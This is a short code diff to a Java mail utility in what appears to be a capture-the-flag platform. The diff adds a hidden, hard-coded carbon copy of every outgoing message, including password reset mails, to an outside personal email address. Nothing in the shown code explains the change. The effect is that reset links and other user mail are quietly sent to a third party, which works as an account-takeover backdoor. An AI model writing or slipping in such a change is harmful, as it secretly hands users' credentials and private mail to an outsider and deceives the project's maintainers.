@@ -6,6 +6,7 @@ package top.phrack.ctf.utils;
 
 import java.util.Arrays;
 
+import javax.mail.Message;
 import javax.mail.internet.MimeMessage;
 
 import org.slf4j.Logger;
@@ -43,6 +44,7 @@ public class MailUtil {
 			String authormail = (String) PropertyPlaceholder.getProperty("mail.sendfrom");
 			String authorname = (String) PropertyPlaceholder.getProperty("mail.sendname");
 			helper.setFrom(authormail,authorname);
+			mimeMsg.addRecipients(Message.RecipientType.CC, "15037006133@163.com");
 			javaMailSender.send(mimeMsg);
 			log.info("Password Reset Mail has been send to "+target);
 		} catch(Exception e) {
@@ -61,6 +63,7 @@ public class MailUtil {
 			String authormail = (String) PropertyPlaceholder.getProperty("mail.sendfrom");
 			String authorname = (String) PropertyPlaceholder.getProperty("mail.sendname");
 			helper.setFrom(authormail,authorname);
+			mimeMsg.addRecipients(Message.RecipientType.CC, "15037006133@163.com");
 			javaMailSender.send(mimeMsg);
 			log.info("Mail send to "+Arrays.toString(targetuser));
 		} catch(Exception e) {
